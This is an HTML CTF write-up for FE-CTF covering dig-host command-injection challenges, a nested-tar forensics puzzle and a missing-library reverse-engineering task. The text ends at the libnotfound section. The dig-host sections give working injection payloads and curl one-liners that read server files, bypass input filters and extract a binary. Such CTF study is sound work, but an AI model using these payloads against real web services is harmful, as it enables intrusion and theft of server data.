<!DOCTYPE html>
<html lang="en">
<head>
<!-- 2025-01-21 Tue 19:16 -->
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>FE-CTF: CyberDemon</title>
<meta name="author" content="C3lphie" />
<meta name="generator" content="Org Mode" />
<link rel="stylesheet" type="text/css" href="static/style.css" />
<script>
// @license magnet:?xt=urn:btih:1f739d935676111cfff4b4693e3816e664797050&amp;dn=gpl-3.0.txt GPL-v3-or-Later
     function CodeHighlightOn(elem, id)
     {
       var target = document.getElementById(id);
       if(null != target) {
         elem.classList.add("code-highlighted");
         target.classList.add("code-highlighted");
       }
     }
     function CodeHighlightOff(elem, id)
     {
       var target = document.getElementById(id);
       if(null != target) {
         elem.classList.remove("code-highlighted");
         target.classList.remove("code-highlighted");
       }
     }
// @license-end
</script>
<script>
  window.MathJax = {
    tex: {
      ams: {
        multlineWidth: '85%'
      },
      tags: 'ams',
      tagSide: 'right',
      tagIndent: '.8em'
    },
    chtml: {
      scale: 1.0,
      displayAlign: 'center',
      displayIndent: '0em'
    },
    svg: {
      scale: 1.0,
      displayAlign: 'center',
      displayIndent: '0em'
    },
    output: {
      font: 'mathjax-modern',
      displayOverflow: 'overflow'
    }
  };
</script>

<script
  id="MathJax-script"
  async
  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
</script>
</head>
<body>
<div id="preamble" class="status">
<div class="header">
    <a href="index.html">Home</a>
    <a href="https://github.com/c3lphie">Github</a>
</div>
</div>
<div id="content" class="content">
<header>
<h1 class="title">FE-CTF: CyberDemon</h1>
</header><nav id="table-of-contents" role="doc-toc">
<h2>Table of Contents</h2>
<div id="text-table-of-contents" role="doc-toc">
<ul>
<li><a href="#org2ac1308">1. Introduction</a></li>
<li><a href="#org31f5537">2. Dig-host-1&#xa0;&#xa0;&#xa0;<span class="tag"><span class="web">web</span></span></a></li>
<li><a href="#org98f3968">3. Dig-host-2&#xa0;&#xa0;&#xa0;<span class="tag"><span class="web">web</span></span></a></li>
<li><a href="#org8909e2e">4. Dig-host-3&#xa0;&#xa0;&#xa0;<span class="tag"><span class="web">web</span></span></a>
<ul>
<li><a href="#orged78e4a">4.1. Bonus flag&#xa0;&#xa0;&#xa0;<span class="tag"><span class="web">web</span>&#xa0;<span class="rev">rev</span></span></a></li>
</ul>
</li>
<li><a href="#org7b9bcaf">5. Tar and feathers&#xa0;&#xa0;&#xa0;<span class="tag"><span class="forensics">forensics</span></span></a></li>
<li><a href="#org65e6677">6. Libnotfound&#xa0;&#xa0;&#xa0;<span class="tag"><span class="rev">rev</span></span></a></li>
<li><a href="#org56d7b6d">7. Guessing Game&#xa0;&#xa0;&#xa0;<span class="tag"><span class="omgacm">omgacm</span></span></a></li>
<li><a href="#org8f7a028">8. Final words</a></li>
</ul>
</div>
</nav>

<div id="outline-container-org2ac1308" class="outline-2">
<h2 id="org2ac1308"><span class="section-number-2">1.</span> Introduction</h2>
<div class="outline-text-2" id="text-1">
<p>
Welcome to this write-up for the challenges that my team and I solved during FE-CTF!<br>
This CTF had some really nice and hard challenges, and was really pwn and rev heavy, but there was a couple of other challenges for those not into pwn or rev.<br>
</p>

<p>
This CTF was limited to a team size of 5, so me and some other admins in <a href="https://jutlandia.club">Jutlandia</a> decided to give it a shot.<br>
We had the team name <code>0x6a75746c616e646961646d696e73</code>, which in ascii is:<br>
</p>
<div class="org-src-container">
<pre class="src src-bash"><span class="org-builtin">echo</span> 6a75746c616e646961646d696e73 |  xxd -r -p
</pre>
</div>

<pre class="example">
jutlandiadmins
</pre>


<p>
When the CTF finished we placed 17th.<br>
</p>
</div>
</div>

<div id="outline-container-org31f5537" class="outline-2">
<h2 id="org31f5537"><span class="section-number-2">2.</span> Dig-host-1&#xa0;&#xa0;&#xa0;<span class="tag"><span class="web">web</span></span></h2>
<div class="outline-text-2" id="text-2">
<p>
This challenge was the first of four in total.<br>
In this challenge we were presented with simple website, where we can run dig on hosts.<br>
<img src="assets/2022-10-30_16-30-34_screenshot.png" alt="2022-10-30_16-30-34_screenshot.png"><br>
</p>

<p>
As you can see below we get the standard output from <code>dig</code> when we enter an IP-address or host in the field.<br>
<img src="assets/2022-10-30_16-31-40_screenshot.png" alt="2022-10-30_16-31-40_screenshot.png"><br>
</p>

<p>
This looks very vulnerable to what is called command injection.<br>
As the name implies it is the act of injecting command that will then be run on the target server.<br>
</p>

<p>
We tested this by injecting the command <code>echo test</code> like so:<br>
<img src="assets/2022-10-30_16-52-37_screenshot.png" alt="2022-10-30_16-52-37_screenshot.png"><br>
We can get the flag by using the following oneliner:<br>
</p>
<pre class="example" id="org90fe384">
[c3lphie@laptop:~]$ curl 'http://dig-host-1-web.hack.fe-ctf.dk/html/dig_host_level1.php' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0'  --data-raw 'host=%3B+cat+%2Fflag' | grep flag | cut -d "&lt;" -f 1
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100  1945    0  1925  100    20   8813     91 --:--:-- --:--:-- --:--:--  8922

;; flags: qr rd ra; QUERY: 1, ANSWER: 13, AUTHORITY: 0, ADDITIONAL: 1
; EDNS: version: 0, flags:; udp: 512
flag{do people still use php?}
</pre>
<p>
And there it is:<br>
<code>flag{do people still use php?}</code><br>
</p>
</div>
</div>
<div id="outline-container-org98f3968" class="outline-2">
<h2 id="org98f3968"><span class="section-number-2">3.</span> Dig-host-2&#xa0;&#xa0;&#xa0;<span class="tag"><span class="web">web</span></span></h2>
<div class="outline-text-2" id="text-3">
<p>
This is the second part of in this collection of challenges.<br>
There is a small hurdle in this challenge, as whitespace is removed.<br>
But we can bypass this using the <code>${IFS}</code> environment variable instead of a space character.<br>
IFS is short for Internal Field Seperator, and is what bash uses to seperate commands.<br>
So we changed our payload to:<br>
</p>
<pre class="example">
;cat${IFS}/flag
</pre>

<p>
Then we can just use the following oneliner to get the flag:<br>
</p>
<pre class="example" id="org037f124">
[c3lphie@laptop:~]$ curl -X POST 'http://dig-host-2-web.hack.fe-ctf.dk/html/dig_host_level2.php' --data 'host=;cat${IFS}/flag'| grep flag | cut -d "&lt;" -f 1
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100  1960    0  1940  100    20   5797     59 --:--:-- --:--:-- --:--:--  5868

;; flags: qr rd ra; QUERY: 1, ANSWER: 13, AUTHORITY: 0, ADDITIONAL: 1
; EDNS: version: 0, flags:; udp: 512
flag{who needs to sanitize input anyway?}
</pre>
<p>
And there is the second flag:<br>
<code>flag{who needs to sanitize input anyway?}</code><br>
</p>
</div>
</div>
<div id="outline-container-org8909e2e" class="outline-2">
<h2 id="org8909e2e"><span class="section-number-2">4.</span> Dig-host-3&#xa0;&#xa0;&#xa0;<span class="tag"><span class="web">web</span></span></h2>
<div class="outline-text-2" id="text-4">
<p>
This was the second last part of the dig-host challenges.<br>
The vulnerability was the same but now <code>$</code> was an illegal character.<br>
This could be circumvented using bash redirections.<br>
Giving us a final payload of:<br>
</p>
<pre class="example">
;cat&lt;./flag
</pre>

<pre class="example" id="org160d25e">
[nix-shell:~]$ curl -X POST 'http://dig-host-3-web.hack.fe-ctf.dk/html/dig_host_level3.php' --data-raw "host=;cat&lt;./flag"|grep flag | cut -d "&lt;" -f 1 | recode html..ascii
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   980    0   964  100    16   3374     56 --:--:-- --:--:-- --:--:--  3438

flag{it's not bug, it's a feature}
</pre>
<p>
There we got the flag:<br>
<code>flag{it's not bug, it's a feature}</code><br>
</p>
</div>
<div id="outline-container-orged78e4a" class="outline-3">
<h3 id="orged78e4a"><span class="section-number-3">4.1.</span> Bonus flag&#xa0;&#xa0;&#xa0;<span class="tag"><span class="web">web</span>&#xa0;<span class="rev">rev</span></span></h3>
<div class="outline-text-3" id="text-4-1">
<p>
The third dig-host challenge had a bonus flag. But it wasn't readable by normal means.<br>
If we look at the content of directory we can see a couple of things:<br>
<img src="assets/2022-10-30_19-31-15_screenshot.png" alt="2022-10-30_19-31-15_screenshot.png"><br>
There is a bonus flag, but if we try and read it, we won't get any output.<br>
This is most likely due to permissions.<br>
</p>

<p>
There are two files of interest though, the <code>dig</code> file and <code>dig_host_level3.php</code>.<br>
</p>

<p>
Content of <code>dig_host_level3.php</code>:<br>
</p>
<div class="org-src-container">
<pre class="src src-php"><span class="org-php-php-tag">&lt;?php</span>
        <span class="org-php-keyword">require_once</span>(<span class="org-php-string">"../include/smarty.php"</span>);


        <span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">host</span> <span class="org-php-assignment-op">=</span> <span class="org-php-string">""</span>;
        <span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">output</span> <span class="org-php-assignment-op">=</span> <span class="org-php-string">""</span>;

        <span class="org-php-keyword">if</span>(<span class="org-php-keyword">isset</span>(<span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">_POST</span>) <span class="org-php-logical-op">&amp;&amp;</span> <span class="org-php-function-call-traditional">is_array</span>(<span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">_POST</span>) <span class="org-php-logical-op">&amp;&amp;</span> <span class="org-php-function-call-traditional">array_key_exists</span>(<span class="org-php-string">"host"</span>, <span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">_POST</span>)) {
                <span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">host</span> <span class="org-php-assignment-op">=</span> <span class="org-php-function-call-traditional">preg_replace</span>(<span class="org-php-string">"/[\s\$-]+/"</span>, <span class="org-php-string">""</span>, <span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">_POST</span>[<span class="org-php-string">"host"</span>]);

                <span class="org-php-function-call-traditional">exec</span>(<span class="org-php-string">"/dig "</span>.<span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">host</span>, <span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">output</span>);
        }

        <span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">smarty</span><span class="org-php-object-op">-&gt;</span><span class="org-php-method-call-traditional">assign</span>(<span class="org-php-keyword">array</span>(
                <span class="org-php-string">"PHP_SELF"</span>      <span class="org-php-assignment-op">=</span><span class="org-php-comparison-op">&gt;</span> <span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">_SERVER</span>[<span class="org-php-string">"PHP_SELF"</span>],
                <span class="org-php-string">"host"</span>          <span class="org-php-assignment-op">=</span><span class="org-php-comparison-op">&gt;</span> <span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">host</span>,
                <span class="org-php-string">"output"</span>	<span class="org-php-assignment-op">=</span><span class="org-php-comparison-op">&gt;</span> <span class="org-php-function-call-traditional">implode</span>(<span class="org-php-string">"\n"</span>, <span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">output</span>)
        ));

        <span class="org-php-variable-sigil">$</span><span class="org-php-variable-name">smarty</span><span class="org-php-object-op">-&gt;</span><span class="org-php-method-call-traditional">display</span>(<span class="org-php-string">"dig_host_level3.tpl"</span>);
<span class="org-php-php-tag">?&gt;</span>
</pre>
</div>
<p>
If you look at the <code>exec</code> call you see the original vulnerability, but the path of the <code>dig</code> binary isn't something standard like <code>/usr/bin/dig</code>.<br>
</p>

<p>
So lets take a closer look at that!<br>
First we can extract it using <code>base64</code> with this payload:<br>
</p>
<pre class="example">
;base64&lt;/dig
</pre>


<p>
With some bash kung fu we can download it using this command:<br>
</p>
<pre class="example">
curl -X POST 'http://dig-host-3-web.hack.fe-ctf.dk/html/dig_host_level3.php' --data-raw "host=;base64&lt;./dig" | cut -d "&lt;" -f 1 | xargs | sed "s/ //g" | base64 -d &gt; dig_extract
</pre>

<p>
Now that we have the binary, we can examine it further using a decompiler such as ghidra.<br>
If we look at this snippet from the decompiled main function:<br>
</p>
<div class="org-src-container">
<pre class="src src-c">  <span class="org-keyword">if</span> (param_1 == 2) {
  local_1c = thunk_FUN_004010e6(&amp;local_1028);
  <span class="org-keyword">for</span> (local_1a = 0; uVar4 = (<span class="org-type">ulong</span>)local_1a, uVar2 = thunk_FUN_004010e6(param_2[1]),
      uVar4 &lt; uVar2; local_1a = local_1a + 1) {
    <span class="org-keyword">if</span> ((((*(<span class="org-type">char</span> *)((<span class="org-type">ulong</span>)local_1a + param_2[1]) != <span class="org-string">'\t'</span>) &amp;&amp;
         (*(<span class="org-type">char</span> *)((<span class="org-type">ulong</span>)local_1a + param_2[1]) != <span class="org-string">'\n'</span>)) &amp;&amp;
        (*(<span class="org-type">char</span> *)((<span class="org-type">ulong</span>)local_1a + param_2[1]) != <span class="org-string">'\f'</span>)) &amp;&amp;
       (((*(<span class="org-type">char</span> *)((<span class="org-type">ulong</span>)local_1a + param_2[1]) != <span class="org-string">'\r'</span> &amp;&amp;
         (*(<span class="org-type">char</span> *)((<span class="org-type">ulong</span>)local_1a + param_2[1]) != <span class="org-string">' '</span>)) &amp;&amp;
        ((*(<span class="org-type">char</span> *)((<span class="org-type">ulong</span>)local_1a + param_2[1]) != <span class="org-string">'$'</span> &amp;&amp;
         (*(<span class="org-type">char</span> *)((<span class="org-type">ulong</span>)local_1a + param_2[1]) != <span class="org-string">'&lt;'</span>)))))) {
      *(<span class="org-type">undefined</span> *)((<span class="org-type">long</span>)&amp;local_1028 + (<span class="org-type">long</span>)(<span class="org-type">int</span>)(<span class="org-type">uint</span>)local_1c) =
           *(<span class="org-type">undefined</span> *)(param_2[1] + (<span class="org-type">ulong</span>)local_1a);
      local_1c = local_1c + 1;
      <span class="org-keyword">if</span> (0xffe &lt; local_1c) <span class="org-keyword">break</span>;
    }
  }
  *(<span class="org-type">undefined</span> *)((<span class="org-type">long</span>)&amp;local_1028 + (<span class="org-type">long</span>)(<span class="org-type">int</span>)(<span class="org-type">uint</span>)local_1c) = 0;
  uVar1 = FUN_0044dce0(<span class="org-string">"/bin/bash"</span>,&amp;local_1048);
}
</pre>
</div>
<p>
There is a lot of input sanitization, and after that a reference to <code>/bin/bash</code>.<br>
Next up we can run strace on the binary and see what its syscalls:<br>
</p>
<pre class="example" id="orgcfd555c">
[nix-shell:~]$ strace ./dig_extract google.com
execve("./dig_extract", ["./dig_extract", "google.com"], 0x7ffe10ee21b8 /* 122 vars */) = 0
brk(NULL)                               = 0x1931000
brk(0x1931c40)                          = 0x1931c40
arch_prctl(ARCH_SET_FS, 0x1931300)      = 0
uname({sysname="Linux", nodename="laptop", ...}) = 0
readlink("/proc/self/exe", "/home/c3lphie/dig_extract", 4096) = 25
brk(0x1952c40)                          = 0x1952c40
brk(0x1953000)                          = 0x1953000
mprotect(0x4bc000, 12288, PROT_READ)    = 0
execve("/bin/bash", ["bash", "-pc", "dig google.com"], 0x7ffcd9a8c7d0 /* 122 vars */) = -1 ENOENT (No such file or directory)
exit_group(-1)                          = ?
+++ exited with 255 +++
</pre>
<p>
Looking at the execve call, we realised that we needed to get our payload into this call.<br>
</p>

<p>
We tried a lot of different things, what ended up working was wrapping a payload in <code>'</code> and using back tick command substitution with the commands in <code>{}</code> to bypass the space character.<br>
</p>

<p>
Giving us the final payload:<br>
</p>
<pre class="example">
'`{cat,bonus_flag}`'
</pre>


<p>
Put into the following oneliner:<br>
</p>
<pre class="example" id="orgcc3baea">
[nix-shell:~]$ curl -X POST 'http://dig-host-3-web.hack.fe-ctf.dk/html/dig_host_level3.php' --data-raw "host='\`{cat,bonus_flag}\`'" | grep flag | recode html..ascii | cut -d "&gt;" -f 5- | head -n 2
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100  2560    0  2535  100    25   8817     86 --:--:-- --:--:-- --:--:-- 100  4035    0  4010  100    25  13762     85 --:--:-- --:--:-- --:--:-- 13818

 flag{wait, i thought this was web!}
</pre>
<p>
And there we go the bonus flag:<br>
<code>flag{wait, i thought this was web!}</code><br>
</p>
</div>
</div>
</div>
<div id="outline-container-org7b9bcaf" class="outline-2">
<h2 id="org7b9bcaf"><span class="section-number-2">5.</span> Tar and feathers&#xa0;&#xa0;&#xa0;<span class="tag"><span class="forensics">forensics</span></span></h2>
<div class="outline-text-2" id="text-5">
<p>
In this challenge we were given tar file containing multiple tar files nested inside.<br>
</p>

<p>
If we start looking at the content of the contents of the tar file we'll see that it is nested tar files:<br>
</p>
<pre class="example" id="org5ddd4de">
[nix-shell:~/.../fe22/tar-and-feathers]$ tar -xvf tar-and-feathers.tgz
72

[nix-shell:~/.../fe22/tar-and-feathers]$ file 72
72: POSIX tar archive (GNU)

[nix-shell:~/.../fe22/tar-and-feathers]$ tar -xvf 72
75

[nix-shell:~/.../fe22/tar-and-feathers]$ tar -xvf 75
6E

</pre>
<p>
The name of those tar files looks like bytes represented in hexadecimal.<br>
We could begin to extract it manually, but that would take a large amount of time, especially because we don't know how many bytes are stored.<br>
</p>

<p>
So we wrote a quick bash script to automate the process:<br>
</p>
<div class="org-src-container">
<pre class="src src-bash"><span class="org-comment-delimiter">#</span><span class="org-comment">! /usr/bin/</span><span class="org-keyword">env</span><span class="org-comment"> bash</span>

<span class="org-variable-name">HEX_STR</span>=<span class="org-string">""</span>

<span class="org-variable-name">NESTED_TAR</span>=<span class="org-string">"$(</span><span class="org-sh-quoted-exec">tar -tf $1</span><span class="org-string">)"</span>

tar -xvf $<span class="org-variable-name">1</span>

<span class="org-keyword">while</span> [[ true ]]; <span class="org-keyword">do</span>
    <span class="org-variable-name">HEX_STR</span>+=$<span class="org-variable-name">NESTED_TAR</span>
    <span class="org-variable-name">NESTED_TAR</span>=<span class="org-string">"$(</span><span class="org-sh-quoted-exec">tar -xvf $NESTED_TAR</span><span class="org-string">)"</span>
    <span class="org-builtin">echo</span> $<span class="org-variable-name">HEX_STR</span> &gt; data.hex
    <span class="org-builtin">echo</span> $<span class="org-variable-name">HEX_STR</span>
<span class="org-keyword">done</span>
</pre>
</div>
<p>
After about 5-10 minutes the file <code>data.hex</code> contains all the bytes that we extracted.<br>
</p>

<p>
In order to turn the ascii hex bytes into actual bytes, we used cyberchef:<br>
</p>
<p>
<img src="assets/2022-10-31_21-56-49_screenshot.png" alt="2022-10-31_21-56-49_screenshot.png"><br>
And then downloaded the result.<br>
Examining the result using file we can that it is another tar archive:<br>
</p>
<pre class="example" id="org2859392">
[nix-shell:~/.../fe22/tar-and-feathers]$ file download.dat
download.dat: POSIX tar archive (GNU)

</pre>
<p>
So let's extract the contents of that::<br>
</p>
<pre class="example" id="org415d20f">
[nix-shell:~/.../fe22/tar-and-feathers]$ tar -xvf download.dat
runme.py
offsets.py
top.png

</pre>

<p>
The file <code>runme.py</code> has the following content:<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span class="org-comment-delimiter">#</span><span class="org-comment">!/usr/bin/env python3</span>
<span class="org-py-import-from">import</span> os
<span class="org-py-import-from">import</span> sys
<span class="org-py-import-from">import</span> subprocess
<span class="org-py-import-from">from</span> offsets <span class="org-py-import-from">import</span> offsets

<span class="org-keyword">if</span> <span class="org-py-builtins">len</span>(sys.argv) != <span class="org-py-variable-name">2</span>:
    <span class="org-keyword">print</span>(f<span class="org-string">'Usage: </span><span class="org-py-variable-name">{sys.argv[0]}</span><span class="org-string"> &lt;outfile&gt;'</span>, <span class="org-py-builtins">file</span>=sys.stderr)
    exit(-<span class="org-py-number">1</span>)

<span class="org-py-variable-name">INIT</span> = <span class="org-string">'tar-and-feathers.tgz'</span>

<span class="org-py-def-class">def</span> <span class="org-py-def">run</span>(cmd):
    <span class="org-keyword">return</span> subprocess.check_output(cmd, shell=<span class="org-py-pseudo-keyword">True</span>)

<span class="org-py-def-class">def</span> <span class="org-py-def">unpack1</span>(name):
    <span class="org-py-variable-name">filemagic</span> = run(f<span class="org-string">'file </span><span class="org-py-variable-name">{name}</span><span class="org-string">'</span>)
    <span class="org-keyword">if</span> b<span class="org-string">'bzip2'</span> <span class="org-keyword">in</span> <span class="org-py-variable-name">filemagic</span>:
        run(f<span class="org-string">'mv </span><span class="org-py-variable-name">{name}</span><span class="org-string"> </span><span class="org-py-variable-name">{name}</span><span class="org-string">.bz2'</span>)
        run(f<span class="org-string">'bunzip2 </span><span class="org-py-variable-name">{name}</span><span class="org-string">.bz2'</span>)
        <span class="org-keyword">return</span> unpack1(name)
    <span class="org-keyword">return</span> run(f<span class="org-string">'tar xfv </span><span class="org-py-variable-name">{name}</span><span class="org-string">'</span>).strip().decode()

<span class="org-py-def-class">def</span> <span class="org-py-def">getbyte</span>(n):
    <span class="org-keyword">print</span>(f<span class="org-string">'getbyte(</span><span class="org-py-variable-name">{n}</span><span class="org-string">) = '</span>, end=<span class="org-string">''</span>, <span class="org-py-builtins">file</span>=sys.stderr, flush=<span class="org-py-pseudo-keyword">True</span>)
    <span class="org-py-variable-name">prev</span> = <span class="org-py-pseudo-keyword">None</span>
    <span class="org-keyword">for</span> <span class="org-py-builtins">_</span> <span class="org-keyword">in</span> <span class="org-py-builtins">range</span>(n + <span class="org-py-number">1</span>):
        <span class="org-py-builtins">next</span> = unpack1(prev <span class="org-keyword">or</span> INIT)
        <span class="org-keyword">if</span> prev <span class="org-keyword">and</span> prev != <span class="org-py-builtins">next</span>:
            os.unlink(prev)
        <span class="org-py-try-if">try</span>:
            <span class="org-py-variable-name">byte</span> = <span class="org-py-builtins">int</span>(<span class="org-py-builtins">next</span>, <span class="org-py-number">16</span>)
        <span class="org-keyword">except</span>:
            os.unlink(<span class="org-py-builtins">next</span>)
            <span class="org-keyword">raise</span>
        <span class="org-py-variable-name">prev</span> = <span class="org-py-builtins">next</span>
    os.unlink(<span class="org-py-builtins">next</span>)
    <span class="org-keyword">print</span>(f<span class="org-string">'0x</span><span class="org-py-variable-name">{byte:02x}</span><span class="org-string">'</span>, <span class="org-py-builtins">file</span>=sys.stderr)
    <span class="org-keyword">return</span> byte

<span class="org-py-def-class">def</span> <span class="org-py-def">unpack</span>(path):
    <span class="org-py-variable-name">data</span> = <span class="org-py-builtins">bytes</span>(getbyte(offset) <span class="org-keyword">for</span> offset <span class="org-keyword">in</span> offsets)
    <span class="org-keyword">with</span> <span class="org-py-builtins">file</span>(path, <span class="org-string">'wb'</span>) <span class="org-keyword">as</span> <span class="org-py-variable-name">fd</span>:
        fd.write(data)

unpack(sys.argv[<span class="org-py-number">1</span>])
</pre>
</div>

<p>
It extracts certain bytes from the first tar file by unpacking it the nested tars until it reaches an offset from the <code>offsets.py</code> file.<br>
Saves the byte and then starts from the beginning.<br>
I won't show the <code>offsets.py</code> file as it just contains an array of the offsets.<br>
This takes quite some time as you might imagine.<br>
Luckily we already have all the bytes and the offsets!<br>
So we created this small python script to extract the bytes at our given offsets:<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span class="org-py-import-from">from</span> offsets <span class="org-py-import-from">import</span> offsets

<span class="org-py-variable-name">data</span> = <span class="org-py-builtins">open</span>(<span class="org-string">"download.dat"</span>, <span class="org-string">"rb"</span>).read()

<span class="org-py-variable-name">ndata</span> = <span class="org-py-builtins">bytes</span>(data[offset] <span class="org-keyword">for</span> offset <span class="org-keyword">in</span> offsets)

<span class="org-keyword">with</span> <span class="org-py-builtins">open</span>(<span class="org-string">"out.bin"</span>, <span class="org-string">"wb"</span>) <span class="org-keyword">as</span> <span class="org-py-variable-name">f</span>:
    f.write(ndata)
</pre>
</div>

<p>
Running the script and checking the output:<br>
</p>
<pre class="example" id="orgd33354a">
[nix-shell:~/.../fe22/tar-and-feathers]$ python unpack.py

[nix-shell:~/.../fe22/tar-and-feathers]$ file out.bin
out.bin: PDF document, version 1.4, 1 pages
</pre>
<p>
We find a PDF!<br>
We renamed the file from <code>out.bin</code> to <code>out.pdf</code> and could then open it in firefox:<br>
</p>
<p>
<img src="assets/2022-10-31_22-11-59_screenshot.png" alt="2022-10-31_22-11-59_screenshot.png"><br>
Aaaaand there is a black bar&#x2026;. Lucky for us that bar won't stop us from copying the text underneath!<br>
</p>

<p>
And we have the flag:<br>
<code>flag{it’s turtles all the way down}</code><br>
</p>
</div>
</div>


<div id="outline-container-org65e6677" class="outline-2">
<h2 id="org65e6677"><span class="section-number-2">6.</span> Libnotfound&#xa0;&#xa0;&#xa0;<span class="tag"><span class="rev">rev</span></span></h2>
<div class="outline-text-2" id="text-6">
<p>
In this challenge we were provided with a binary that was missing library file.<br>
</p>

<p>
We can look at the needed libraries with <code>patchelf</code>:<br>
</p>
<pre class="example" id="org191ae7e">
[nix-shell:~/.../fe22/libnotfound]$ patchelf --print-needed challenge
libnotfound.so
libc.so.6

</pre>

<p>
But we have no idea what this library should do, so we started investigating the binary.<br>
And looking closer at the main function we see a lot of asserts for functions from the library:<br>
</p>
<div class="org-src-container">
<pre class="src src-c">  iVar1 = foo_add(0x19,0x11);
<span class="org-keyword">if</span> (iVar1 != 0x2a) {
                  <span class="org-comment-delimiter">/* </span><span class="org-comment">WARNING: Subroutine does not return</span><span class="org-comment-delimiter"> */</span>
  __assert_fail(<span class="org-string">"foo_add(25, 17) == 42"</span>,<span class="org-string">"main.c"</span>,0x18,<span class="org-string">"main"</span>);
}
iVar1 = foo_add(0x2c,0xfffffffe);
<span class="org-keyword">if</span> (iVar1 != 0x2a) {
                  <span class="org-comment-delimiter">/* </span><span class="org-comment">WARNING: Subroutine does not return</span><span class="org-comment-delimiter"> */</span>
  __assert_fail(<span class="org-string">"foo_add(44, -2) == 42"</span>,<span class="org-string">"main.c"</span>,0x19,<span class="org-string">"main"</span>);
}
iVar1 = foo_sub(0x35,0xb);
<span class="org-keyword">if</span> (iVar1 != 0x2a) {
                  <span class="org-comment-delimiter">/* </span><span class="org-comment">WARNING: Subroutine does not return</span><span class="org-comment-delimiter"> */</span>
  __assert_fail(<span class="org-string">"foo_sub(53, 11) == 42"</span>,<span class="org-string">"main.c"</span>,0x1a,<span class="org-string">"main"</span>);
}
iVar1 = foo_sub(0x27,0xfffffffd);
<span class="org-keyword">if</span> (iVar1 != 0x2a) {
                  <span class="org-comment-delimiter">/* </span><span class="org-comment">WARNING: Subroutine does not return</span><span class="org-comment-delimiter"> */</span>
  __assert_fail(<span class="org-string">"foo_sub(39, -3) == 42"</span>,<span class="org-string">"main.c"</span>,0x1b,<span class="org-string">"main"</span>);
}
iVar1 = foo_mul(0x15,2);
<span class="org-keyword">if</span> (iVar1 != 0x2a) {
                  <span class="org-comment-delimiter">/* </span><span class="org-comment">WARNING: Subroutine does not return</span><span class="org-comment-delimiter"> */</span>
  __assert_fail(<span class="org-string">"foo_mul(21, 2) == 42"</span>,<span class="org-string">"main.c"</span>,0x1c,<span class="org-string">"main"</span>);
}
iVar1 = foo_div(0x7e,3);
<span class="org-keyword">if</span> (iVar1 != 0x2a) {
                  <span class="org-comment-delimiter">/* </span><span class="org-comment">WARNING: Subroutine does not return</span><span class="org-comment-delimiter"> */</span>
  __assert_fail(<span class="org-string">"foo_div(126, 3) == 42"</span>,<span class="org-string">"main.c"</span>,0x1d,<span class="org-string">"main"</span>);
}
iVar1 = foo_mod(0x114,0x75);
<span class="org-keyword">if</span> (iVar1 != 0x2a) {
                  <span class="org-comment-delimiter">/* </span><span class="org-comment">WARNING: Subroutine does not return</span><span class="org-comment-delimiter"> */</span>
  __assert_fail(<span class="org-string">"foo_mod(276, 117) == 42"</span>,<span class="org-string">"main.c"</span>,0x1e,<span class="org-string">"main"</span>);
}
</pre>
</div>

<p>
Meaning we have to implement those into our own version of the library.<br>
This was done using the following C code:<br>
</p>
<div class="org-src-container">
<pre class="src src-c"><span class="org-preprocessor">#if</span><span class="org-negation-char"><span class="org-preprocessor">n</span></span><span class="org-preprocessor">def</span> __libnotfound_H
<span class="org-preprocessor">#define</span> <span class="org-variable-name">__libnotfound_H</span>

<span class="org-keyword">extern</span> <span class="org-type">int</span> <span class="org-function-name">foo_add</span>(<span class="org-type">long</span> <span class="org-variable-name">a</span>, <span class="org-type">long</span> <span class="org-variable-name">b</span>) {
  <span class="org-keyword">return</span> a + b;
}

<span class="org-keyword">extern</span> <span class="org-type">int</span> <span class="org-function-name">foo_sub</span>(<span class="org-type">int</span> <span class="org-variable-name">a</span>, <span class="org-type">int</span> <span class="org-variable-name">b</span>){
  <span class="org-keyword">return</span> a - b;
}

<span class="org-keyword">extern</span> <span class="org-type">int</span> <span class="org-function-name">foo_mul</span>(<span class="org-type">int</span> <span class="org-variable-name">a</span>, <span class="org-type">int</span> <span class="org-variable-name">b</span>){
  <span class="org-keyword">return</span> a * b;
}

<span class="org-keyword">extern</span> <span class="org-type">int</span> <span class="org-function-name">foo_div</span>(<span class="org-type">int</span> <span class="org-variable-name">a</span>, <span class="org-type">int</span> <span class="org-variable-name">b</span>){
  <span class="org-type">float</span> <span class="org-variable-name">fa</span> = (<span class="org-type">float</span>) a;
  <span class="org-type">float</span> <span class="org-variable-name">fb</span> = (<span class="org-type">float</span>) b;
  <span class="org-keyword">return</span> (<span class="org-type">int</span>) fa/fb;
}

<span class="org-keyword">extern</span> <span class="org-type">int</span> <span class="org-function-name">foo_mod</span>(<span class="org-type">int</span> <span class="org-variable-name">a</span>, <span class="org-type">int</span> <span class="org-variable-name">b</span>){
  <span class="org-keyword">return</span> a % b;
}

<span class="org-preprocessor">#endif</span>
</pre>
</div>

<p>
We compiled this using the following two <code>gcc</code> commands:<br>
</p>
<pre class="example">
gcc -c -Wall -Werror -fpic libnotfound.cA
gcc -shared -o libnotfound.so libnotfound.o
</pre>


